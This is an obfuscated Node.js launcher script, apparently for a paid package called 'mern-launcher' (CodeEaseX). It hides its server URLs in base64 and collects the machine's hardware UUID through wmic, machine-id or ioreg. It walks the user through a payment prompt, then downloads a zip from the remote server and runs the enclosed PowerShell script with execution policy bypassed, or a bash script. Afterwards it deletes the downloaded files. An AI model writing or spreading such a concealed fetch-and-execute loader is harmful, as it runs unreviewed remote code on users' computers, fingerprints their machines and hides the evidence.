#!/usr/bin/env node

function a0_0x486c(_0x3397dc, _0x455781) {
  const _0xdcf45 = a0_0xdcf4();
  return (
    (a0_0x486c = function (_0x486c40, _0x3c1418) {
      _0x486c40 = _0x486c40 - 0x1f2;
      let _0x27089f = _0xdcf45[_0x486c40];
      return _0x27089f;
    }),
    a0_0x486c(_0x3397dc, _0x455781)
  );
}
const a0_0x562478 = a0_0x486c;
(function (_0x3e3421, _0x2a455e) {
  const _0x4705e1 = a0_0x486c,
    _0x39cb07 = _0x3e3421();
  while (!![]) {
    try {
      const _0x52041c =
        (parseInt(_0x4705e1(0x222)) / 0x1) *
          (parseInt(_0x4705e1(0x1f7)) / 0x2) +
        -parseInt(_0x4705e1(0x217)) / 0x3 +
        -parseInt(_0x4705e1(0x23d)) / 0x4 +
        -parseInt(_0x4705e1(0x22e)) / 0x5 +
        (parseInt(_0x4705e1(0x245)) / 0x6) *
          (-parseInt(_0x4705e1(0x226)) / 0x7) +
        parseInt(_0x4705e1(0x20b)) / 0x8 +
        (-parseInt(_0x4705e1(0x201)) / 0x9) *
          (-parseInt(_0x4705e1(0x215)) / 0xa);
      if (_0x52041c === _0x2a455e) break;
      else _0x39cb07["push"](_0x39cb07["shift"]());
    } catch (_0x3504ba) {
      _0x39cb07["push"](_0x39cb07["shift"]());
    }
  }
})(a0_0xdcf4, 0x5cb65);
import { execSync, spawn } from "child_process";
import a0_0x190426 from "os";
import a0_0x53f4c6 from "path";
import { fileURLToPath } from "url";
import a0_0x137123 from "fs";
import a0_0x58cdf9 from "axios";
import a0_0x5cc020 from "adm-zip";
const homePath = a0_0x190426[a0_0x562478(0x1fd)](),
  codeEasePath = a0_0x53f4c6[a0_0x562478(0x200)](homePath, a0_0x562478(0x22d)),
  __filename = fileURLToPath(import.meta[a0_0x562478(0x231)]),
  __dirname = a0_0x53f4c6[a0_0x562478(0x225)](__filename),
  packageDir = a0_0x53f4c6["resolve"](__dirname),
  setupDir = a0_0x53f4c6[a0_0x562478(0x200)](packageDir, a0_0x562478(0x208)),
  zipPath = a0_0x53f4c6["join"](packageDir, "setup.zip"),
  package_name = a0_0x562478(0x210);
function cleanup() {
  const _0x17ab18 = a0_0x562478;
  try {
    a0_0x137123["existsSync"](zipPath) &&
      a0_0x137123[_0x17ab18(0x224)](zipPath),
      a0_0x137123[_0x17ab18(0x211)](setupDir) &&
        a0_0x137123["rmSync"](setupDir, { recursive: !![], force: !![] }),
      console[_0x17ab18(0x1fe)]("✅\x20Successfully\x20completed!");
  } catch (_0x2fe940) {
    console["error"](_0x17ab18(0x238), _0x2fe940[_0x17ab18(0x213)]);
  }
}
function a0_0xdcf4() {
  const _0x34bd5e = [
    "SIGINT",
    "data",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
    "-File",
    ".codeEaseX",
    "2444675VEfooR",
    "wmic\x20csproduct\x20get\x20UUID",
    "✅\x20Payment\x20Successfull...",
    "url",
    "setup.sh",
    "setup.ps1",
    "writeFileSync",
    "Running\x20setup\x20for\x20",
    "❌\x20Error\x20Invalid\x20License",
    "✅\x20verified\x20user,\x20Proceeding...",
    "❌\x20Cleanup\x20failed:",
    "🔄\x20Waiting\x20for\x20payment\x20confirmation...",
    "license",
    "split",
    "post",
    "1335888YOrwBH",
    "stdin",
    "Press\x20\x1b[32mENTER\x1b[0m\x20to\x20proceed\x20with\x20the\x20payment.",
    "trim",
    "\x0a\x20\x20\x20\x20=================================\x0a\x20\x20\x20\x20🚀\x20Thank\x20for\x20choosing\x20CodeEaseX\x20!\x0a\x20\x20\x20\x20Follow\x20the\x20prompts\x20to\x20configure\x20your\x20setup.\x0a\x20\x20\x20\x20=================================\x0a\x20\x20",
    "setRawMode",
    "✅\x20Free\x20Trial\x20Activated...",
    "powershell.exe",
    "18XXIDQc",
    "ioreg\x20-rd1\x20-c\x20IOPlatformExpertDevice\x20|\x20awk\x20-F\x27\x22\x27\x20\x27/IOPlatformUUID/\x20{print\x20$4}\x27",
    "arraybuffer",
    "base64",
    "nohup\x20xdg-open\x20\x22",
    "resolve",
    "🚨\x20Uncaught\x20Exception:",
    "❌\x20Payment\x20check\x20timed\x20out.\x20Please\x20try\x20again.",
    "active",
    "16gcXjiL",
    "🔍\x20Checking,\x20Please\x20wait!!",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
    "open\x20\x22",
    "mernLauncher",
    "utf-8",
    "homedir",
    "log",
    "\x0aRedirecting\x20to\x20payment\x20page...",
    "join",
    "297GIezUC",
    "toString",
    "aHR0cHM6Ly9ocnV0aGlrLmFub3guc3RvcmUvcGF5bWVudA==",
    "freeTrial",
    "exit",
    "startsWith",
    "Linux/macOS",
    "setup",
    "\x22\x20>\x20/dev/null\x202>&1\x20&",
    "platform",
    "971888SRrRZA",
    "darwin",
    "-ExecutionPolicy",
    "readFileSync",
    "push",
    "mern-launcher",
    "existsSync",
    "error",
    "message",
    "Windows",
    "358310jtJAdU",
    "start\x20\x22\x22\x20\x22",
    "42252MAJwGf",
    "...\x0a",
    "extractAllTo",
    "success",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrVHJpYWw=",
    "credentials",
    "win32",
    "pause",
    "from",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L3JlZ2lzdGVy",
    "linux",
    "24949ZEskiU",
    "uncaughtException",
    "unlinkSync",
    "dirname",
    "669109htijUE",
    "Bypass",
    "ignore",
  ];
  a0_0xdcf4 = function () {
    return _0x34bd5e;
  };
  return a0_0xdcf4();
}
async function generateUUID() {
  const _0x27f372 = a0_0x562478;
  let _0x242038;
  if (a0_0x190426[_0x27f372(0x20a)]() === "win32")
    _0x242038 = execSync(_0x27f372(0x22f))
      [_0x27f372(0x202)]()
      [_0x27f372(0x23b)]("\x0a")[0x1]
      [_0x27f372(0x240)]();
  else {
    if (a0_0x190426[_0x27f372(0x20a)]() === _0x27f372(0x221))
      _0x242038 = execSync("cat\x20/var/lib/dbus/machine-id")
        [_0x27f372(0x202)]()
        ["trim"]();
    else
      a0_0x190426["platform"]() === "darwin" &&
        (_0x242038 = execSync(_0x27f372(0x246))
          ["toString"]()
          [_0x27f372(0x240)]());
  }
  return _0x242038;
}
function getLicenseToken(_0x56fd45) {
  const _0xa5c2f8 = a0_0x562478;
  if (!a0_0x137123[_0xa5c2f8(0x211)](codeEasePath)) return null;
  const _0x53cda9 = a0_0x137123[_0xa5c2f8(0x20e)](codeEasePath, "utf-8")[
    _0xa5c2f8(0x23b)
  ]("\x0a");
  for (const _0x209fc6 of _0x53cda9) {
    if (_0x209fc6[_0xa5c2f8(0x206)](_0x56fd45 + "="))
      return _0x209fc6["split"]("=")[0x1]["trim"]();
  }
  return null;
}
function saveLicenseToken(_0x3ab568, _0x29b561) {
  const _0x397e05 = a0_0x562478;
  let _0x479534 = [],
    _0x7063ee = ![];
  if (a0_0x137123["existsSync"](codeEasePath)) {
    const _0x33a882 = a0_0x137123[_0x397e05(0x20e)](
      codeEasePath,
      _0x397e05(0x1fc)
    )[_0x397e05(0x23b)]("\x0a");
    for (const _0x1d8a4b of _0x33a882) {
      _0x1d8a4b[_0x397e05(0x206)](_0x3ab568 + "=")
        ? (_0x479534["push"](_0x3ab568 + "=" + _0x29b561), (_0x7063ee = !![]))
        : _0x479534[_0x397e05(0x20f)](_0x1d8a4b);
    }
  }
  !_0x7063ee && _0x479534["push"](_0x3ab568 + "=" + _0x29b561),
    a0_0x137123["writeFileSync"](
      codeEasePath,
      _0x479534[_0x397e05(0x200)]("\x0a")
    );
}
async function installProject(_0x49e5aa) {
  const _0x5cea72 = a0_0x562478;
  try {
    const _0x4922e2 = getLicenseToken(_0x49e5aa),
      _0x2901cf = await a0_0x58cdf9[_0x5cea72(0x23c)](
        Buffer[_0x5cea72(0x21f)](_0x5cea72(0x1f9), "base64")[_0x5cea72(0x202)](
          _0x5cea72(0x1fc)
        ),
        {
          licenseToken: _0x4922e2,
          project: _0x5cea72(0x1fb),
          packageName: _0x49e5aa,
        },
        { responseType: _0x5cea72(0x247) }
      );
    a0_0x137123[_0x5cea72(0x234)](zipPath, _0x2901cf["data"]);
    const _0x41b4b9 = new a0_0x5cc020(zipPath);
    _0x41b4b9[_0x5cea72(0x219)](setupDir, !![]);
  } catch (_0x47eec5) {
    console["log"]("❌\x20Server\x20is\x20Busy,\x20try\x20again\x20later!!"),
      process["exit"](0x1);
  }
}
async function checkLicense(_0x533aac) {
  const _0x170cd3 = a0_0x562478;
  try {
    let _0x3dcdf4 = getLicenseToken(_0x533aac);
    if (_0x3dcdf4) {
      const _0x22d5ea = await generateUUID(),
        _0x5b0087 = await a0_0x58cdf9[_0x170cd3(0x23c)](
          Buffer[_0x170cd3(0x21f)](_0x170cd3(0x22b), _0x170cd3(0x248))[
            _0x170cd3(0x202)
          ](_0x170cd3(0x1fc)),
          { packageName: _0x533aac },
          { headers: { "X-License-Key": _0x22d5ea } }
        );
      if (
        _0x5b0087[_0x170cd3(0x22a)][_0x170cd3(0x21c)]["status"] ===
        _0x170cd3(0x1f6)
      )
        return console[_0x170cd3(0x1fe)](_0x170cd3(0x237)), !![];
    }
    const _0x510b9a = await generateUUID(),
      _0x318f7d = await a0_0x58cdf9[_0x170cd3(0x23c)](
        Buffer[_0x170cd3(0x21f)](_0x170cd3(0x220), "base64")["toString"](
          _0x170cd3(0x1fc)
        ),
        { packageName: _0x533aac },
        { headers: { "X-License-Key": _0x510b9a } }
      );
    if (_0x318f7d[_0x170cd3(0x22a)][_0x170cd3(0x21a)]) {
      if (_0x318f7d["data"][_0x170cd3(0x204)] === _0x170cd3(0x1f6))
        return (
          console["log"](_0x170cd3(0x243)),
          saveLicenseToken(
            _0x533aac,
            _0x318f7d[_0x170cd3(0x22a)][_0x170cd3(0x23a)]
          ),
          !![]
        );
      return (
        console[_0x170cd3(0x1fe)](_0x170cd3(0x23f)),
        process[_0x170cd3(0x23e)]["setRawMode"](!![]),
        process[_0x170cd3(0x23e)]["resume"](),
        new Promise((_0x4ce805) => {
          const _0x459f89 = _0x170cd3;
          process[_0x459f89(0x23e)]["on"](_0x459f89(0x22a), async () => {
            const _0x560118 = _0x459f89;
            process["stdin"][_0x560118(0x242)](![]),
              process[_0x560118(0x23e)][_0x560118(0x21e)](),
              console[_0x560118(0x1fe)](_0x560118(0x1ff));
            const _0x2bcb89 =
              Buffer["from"](_0x560118(0x203), _0x560118(0x248))[
                _0x560118(0x202)
              ](_0x560118(0x1fc)) +
              "/" +
              package_name +
              "/" +
              _0x510b9a;
            if (a0_0x190426[_0x560118(0x20a)]() === "win32")
              execSync(_0x560118(0x216) + _0x2bcb89 + "\x22", {
                stdio: "ignore",
              });
            else
              a0_0x190426["platform"]() === _0x560118(0x20c)
                ? execSync(_0x560118(0x1fa) + _0x2bcb89 + "\x22", {
                    stdio: _0x560118(0x228),
                    detached: !![],
                  })
                : execSync(_0x560118(0x1f2) + _0x2bcb89 + _0x560118(0x209), {
                    stdio: "ignore",
                    detached: !![],
                  });
            console[_0x560118(0x1fe)](_0x560118(0x239));
            let _0x1a42f4 = ![],
              _0x269232 = 0x0;
            const _0x4d1e07 = 0x2d;
            while (!_0x1a42f4 && _0x269232 < _0x4d1e07) {
              await new Promise((_0x1161a9) => setTimeout(_0x1161a9, 0x3a98)),
                _0x269232++;
              const _0x18ab4b = await a0_0x58cdf9[_0x560118(0x23c)](
                Buffer[_0x560118(0x21f)](_0x560118(0x22b), _0x560118(0x248))[
                  _0x560118(0x202)
                ]("utf-8"),
                { packageName: _0x533aac },
                { headers: { "X-License-Key": _0x510b9a } }
              );
              console[_0x560118(0x1fe)](_0x560118(0x1f8));
              if (
                _0x18ab4b[_0x560118(0x22a)][_0x560118(0x21c)]["status"] ===
                _0x560118(0x1f6)
              )
                return (
                  saveLicenseToken(
                    _0x533aac,
                    _0x18ab4b[_0x560118(0x22a)]["credentials"]["license"]
                  ),
                  console[_0x560118(0x1fe)](_0x560118(0x230)),
                  (_0x1a42f4 = !![]),
                  _0x4ce805(!![]),
                  !![]
                );
            }
            console[_0x560118(0x1fe)](_0x560118(0x1f5)), process["exit"](0x1);
          });
        })
      );
    }
  } catch (_0x3abccb) {
    console[_0x170cd3(0x1fe)](
      "❌\x20Server\x20is\x20busy,\x20try\x20again\x20later!!"
    ),
      process["exit"](0x1);
  }
}
async function main() {
  const _0xba4dd3 = a0_0x562478;
  console["log"](_0xba4dd3(0x241));
  const _0x405c59 = await checkLicense(package_name);
  !_0x405c59 && console[_0xba4dd3(0x1fe)](_0xba4dd3(0x236));
  await installProject(package_name);
  const _0x26312f = await generateUUID();
  await a0_0x58cdf9[_0xba4dd3(0x23c)](
    Buffer[_0xba4dd3(0x21f)](_0xba4dd3(0x21b), "base64")[_0xba4dd3(0x202)](
      "utf-8"
    ),
    { packageName: package_name, uuid: _0x26312f }
  );
  const _0x421431 = a0_0x190426["platform"](),
    _0x35504e =
      _0x421431 === "win32"
        ? a0_0x53f4c6[_0xba4dd3(0x200)](setupDir, "ps1", _0xba4dd3(0x233))
        : a0_0x53f4c6[_0xba4dd3(0x200)](setupDir, "cmd", _0xba4dd3(0x232)),
    _0x266461 = a0_0x53f4c6[_0xba4dd3(0x1f3)](__dirname, _0x35504e);
  console[_0xba4dd3(0x1fe)](
    _0xba4dd3(0x235) +
      (_0x421431 === "win32" ? _0xba4dd3(0x214) : _0xba4dd3(0x207)) +
      _0xba4dd3(0x218)
  ),
    spawn(
      _0x421431 === _0xba4dd3(0x21d) ? _0xba4dd3(0x244) : "bash",
      _0x421431 === _0xba4dd3(0x21d)
        ? [_0xba4dd3(0x20d), _0xba4dd3(0x227), _0xba4dd3(0x22c), _0x266461]
        : [_0x266461],
      { stdio: "inherit" }
    );
}
process["on"](a0_0x562478(0x205), cleanup),
  process["on"](a0_0x562478(0x229), () => {
    const _0x5ef8e9 = a0_0x562478;
    console[_0x5ef8e9(0x1fe)](
      "\x0a⚠️\x20\x20Process\x20interrupted.\x20Cleaning\x20up..."
    ),
      cleanup(),
      process["exit"](0x1);
  }),
  process["on"](a0_0x562478(0x223), (_0xb6f90e) => {
    const _0x31939c = a0_0x562478;
    console[_0x31939c(0x212)](_0x31939c(0x1f4), _0xb6f90e),
      cleanup(),
      process["exit"](0x1);
  }),
  main();
